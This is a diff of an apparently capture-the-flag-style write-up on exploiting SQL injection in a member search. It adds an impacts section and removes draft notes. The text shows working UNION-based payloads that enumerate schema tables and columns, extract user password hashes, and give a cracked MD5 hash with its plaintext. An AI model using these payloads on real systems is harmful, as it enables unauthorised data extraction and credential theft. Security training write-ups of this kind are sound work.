@@ -43,7 +43,7 @@ This breach exploits an SQL Injection vulnerability in a member search functiona
      Surname: GetThe
      ```
 
-2. **Database Schema Enumeration:**
+2. **List database tables:**
    - Used UNION-based injection to list database tables:
      ```sql
      1 UNION SELECT table_name, null FROM information_schema.tables
@@ -59,7 +59,7 @@ This breach exploits an SQL Injection vulnerability in a member search functiona
      Surname: 
      ```
 
-3. **Column Enumeration:**
+3. **List "users" Columns :**
    - Extracted column names from the `users` table:
      ```sql
      1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x7573657273--
@@ -137,6 +137,17 @@ This breach exploits an SQL Injection vulnerability in a member search functiona
     WHERE user_id = [user input]
 ---
 
+
+
+### 🔴 Critical Security Impacts:
+
+- **Complete Data Exposure**: All user information including personal details and password hashes were accessible to attackers
+  
+- **Authentication Compromise**: MD5 password hashes were successfully extracted and cracked (e.g., "FortyTwo")
+  
+- **Database Structure Revealed**: Full enumeration of database tables and columns, providing attackers with comprehensive system knowledge
+  
+---
 ## 📌 Security Recommendations:
 
 1. **Implement Parameterized Queries:**
@@ -167,72 +178,3 @@ This breach exploits an SQL Injection vulnerability in a member search functiona
 
 
 
-
-
-
-
-<!-- # SQL Injection Vulnerability in member search :
-
-
-### Step 1: Initial Vulnerability Testing
-Input in the id parameter:
-```sql
-1 OR 1=1
-```
-
-Results:
-```
-ID: 1 or 1=1  
-First name: one
-Surname: me
-
-ID: 1 or 1=1  
-First name: two
-Surname: me
-
-ID: 1 or 1=1  
-First name: three
-Surname: me
-
-ID: 1 or 1=1  
-First name: Flag
-Surname: GetThe
-
-
-
-```
-2- list all tables
-### 1 UNION SELECT table_name, null FROM information_schema.tables
-
-3 - list all user table columns 
-### 1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x7573657273--
-c
-### 1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x696D61676573 --
-4 - 
-#### 1 UNION SELECT first_name, countersign FROM users--
-
-l9aaw 5ff9d0165b4f92b14994e5c685cdce28 = FortyTwo
-
-5 -  1 UNION SELECT first_name, Commentaire FROM users--
-
-"Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
-
-
-list all cloumns 1 UNION SELECT column_name, null FROM information_schema.columns--
-
-
-
-fortytwo ->  10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
-
-
-USER_PRIVILEGES 0x555345525f50524956494c45474553
- 1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x555345525f50524956494c45474553--
-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 0x4752414e544545--
-
-
-## db name
-1 UNION SELECT database(), null--
-
-
-
-SELECT first_name, surname FROM users WHERE id = [user input] -->
